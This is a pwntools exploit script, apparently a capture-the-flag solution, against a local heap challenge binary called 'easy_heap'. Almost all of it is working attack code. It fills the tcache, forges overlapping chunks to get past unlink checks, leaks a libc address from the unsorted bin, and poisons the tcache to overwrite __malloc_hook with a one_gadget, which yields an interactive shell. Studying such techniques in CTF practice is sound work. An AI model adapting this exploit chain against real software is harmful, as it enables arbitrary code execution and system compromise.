from pwn import *
#ARCH SETTING
context(arch = 'amd64' , os = 'linux')
r = process('./easy_heap')
#r = remote('127.0.0.1',9999)

#FUNCTION DEFINE
def new(size,content):
    r.recvuntil("?\n> ")
    r.sendline("1")
    r.recvuntil("size \n> ")
    r.sendline(str(size))
    r.recvuntil("content \n> ")
    r.send(content)

def newz():
    r.recvuntil("?\n> ")
    r.sendline("1")
    r.recvuntil("size \n> ")
    r.sendline(str(0))

def delet(idx):
    r.recvuntil("?\n> ")
    r.sendline("2")
    r.recvuntil("index \n> ")
    r.sendline(str(idx))

def echo(idx):
    r.recvuntil("?\n> ")
    r.sendline("3")
    r.recvuntil("index \n> ")
    r.sendline(str(idx))

#MAIN EXPLOIT

#memory leak
#prepare for EG attack ,we will build a chunk with presize 0x200
for i in range(10):
    newz()
#fill tcache
for i in range(3,10):
    delet(i)
#chunk0 1 merge to ustbin, and the chunk2.presize will be 0x200
delet(0)
delet(1)
delet(2) #to make presize stable;maybe only link change both presize and sizeinuse, unlink only change inuse
#x = input("debug")
#then our target is cross-merge
#for cross-merge we must make sure that chunk0 is freed for bypass
#clean tcache
for i in range(7):
    newz() #idx.0~7
#x = input("debug33")
newz() #idx.7 chunk0
#x = input("debug33")
newz() #idx.8 chunk1
#x = input("debug33")
newz() #idx.9 chunk2
#x = input("debugggg")
#fill tcache
for i in range(0,7):
    delet(i)
#chunk0 into unsorted bin to correct fd & bk for bypass unlink check
delet(7)
#out a chunk from tcache to give a space for chunk1 in-out ,in order to prevent merging again
newz() #idx.0
delet(8)
new(0xf8,'\x00') #idx.1 ,we hold it
delet(0) #give back idx.0 to refill tcache
delet(9) #fire
#x = input("debug0")
#clean tcache
for i in range(7):
    newz() #idx:0 , 2~7
newz() #idx.8 to cut chunk0, now chunk1.fd & bk point unsorted bin merging with chunk2
#x = input("debug")
echo(1)
unsorted_bin = u64(r.recv(6).ljust(8,'\x00'))
libc_base = unsorted_bin - 0x3dac78
print(hex(libc_base))
malloc_hook = libc_base + 0x3dac10
onegadget = libc_base + 0xfdb8e #0x47ca1 #0x7838e #0x47c9a #0xfccde
#x = input("pause")

#hijack
newz() #idx.9
#now we hold idx.1&9  pointing chunk1
delet(0) #passby counts check
delet(1)
delet(9)
new(0x10,p64(malloc_hook))
newz()
new(0x10,p64(onegadget))

#fire
#according to the logic that size is inputed after malloc
delet(2) #passby idxtable full check
#x = input("fucking")
r.recvuntil("?\n> ")
r.sendline("1")
r.interactive()
